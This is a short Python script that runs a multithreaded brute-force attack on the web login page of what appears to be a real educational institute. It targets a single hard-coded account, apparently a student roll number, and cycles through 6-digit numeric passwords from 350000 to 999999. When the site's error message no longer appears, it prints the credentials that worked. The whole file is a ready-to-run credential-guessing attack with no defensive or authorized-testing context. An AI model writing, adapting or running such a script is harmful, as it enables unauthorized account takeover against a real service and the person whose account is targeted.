import requests
from concurrent.futures import ThreadPoolExecutor
import sys

URL = "https://app.biomeinstitute.in/weblogin/"
ROLL = "25002833"
THREADS = 20
START = 350000
END = 999999

# Define the known invalid login message
INVALID_MESSAGE = "Invalid your username and password"

def attempt_login(password):
    data = {
        "sublogin": "1",
        "username": ROLL,
        "password": str(password).zfill(6),
        "Login": "Secure Login"
    }
    try:
        response = requests.post(URL, data=data, timeout=5)
        if INVALID_MESSAGE not in response.text:
            print("\n===========================================")
            print(f"SUCCESS! Roll: {ROLL} Password: {password}")
            print("===========================================")
            sys.exit(0)  # Stop the script if success is found
    except requests.RequestException as e:
        print(f"Request failed for {password}: {e}")

def main():
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for password in range(START, END + 1):
            executor.submit(attempt_login, password)

if __name__ == "__main__":
    main()
